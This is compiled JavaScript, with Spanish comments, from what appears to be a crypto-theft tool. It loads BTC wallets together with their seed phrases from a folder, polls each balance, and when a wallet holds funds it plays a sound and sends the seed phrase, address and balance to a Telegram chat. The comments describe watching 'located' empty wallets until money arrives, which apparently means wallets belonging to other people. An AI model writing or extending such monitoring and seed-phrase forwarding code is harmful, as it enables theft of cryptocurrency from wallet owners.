"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.consultarWalletsVacias = void 0;
const path_1 = __importDefault(require("path"));
const child_process_1 = require("child_process");
const consultarSaldoWallet_1 = require("../services/consultarSaldoWallet");
const telegram_1 = require("./telegram/telegram");
const leerWalletsDesdeCarpeta_1 = require("./leerWalletsDesdeCarpeta");
const delay_1 = require("./delay");
//ruta del sonido
const rutaSonido = path_1.default.join(__dirname, "../data/sonido/mision-cumplida1.wav");
//funcion para sonsultar las wallets que ubicamos, pero vacias
// a ver si ingreso dinero
const consultarWalletsVacias = async () => {
    const wallets = (0, leerWalletsDesdeCarpeta_1.leerWalletsDesdeCarpeta)();
    for (const wallet of wallets) {
        await validarBTC(wallet);
    }
};
exports.consultarWalletsVacias = consultarWalletsVacias;
//validar si es BTC
const validarBTC = async (wallet) => {
    try {
        // delay por rate limit
        await (0, delay_1.delay)(1000);
        const resultado = await (0, consultarSaldoWallet_1.consultarSaldoWallet)(wallet.direccion);
        console.log(`Dirección BTC: ${wallet.direccion}`);
        console.log(`Saldo confir: ${resultado.confirmed} > unconfir: ${resultado.unconfirmed} > recibe: ${resultado.received}`);
        console.log("----------------------------------------");
        if (resultado.confirmed > 0 || resultado.unconfirmed > 0) {
            //reproducir sonido
            (0, child_process_1.exec)(`powershell -c (New-Object Media.SoundPlayer '${rutaSonido}').PlaySync();`);
            //armar objeto
            const datosCompletos = {
                frase: wallet.frase,
                wallet_de: `BTC`,
                direccion: wallet.direccion,
                saldo: `Confir: ${resultado.confirmed}, unconfir: ${resultado.unconfirmed}`,
                fecha: new Date().toISOString(),
            };
            //enviar mensaje por telegram
            (0, telegram_1.enviarMensajeTelegram)(datosCompletos);
        }
    }
    catch (error) {
        console.error(`Error al consultar ${wallet.direccion}:`, error);
    }
};
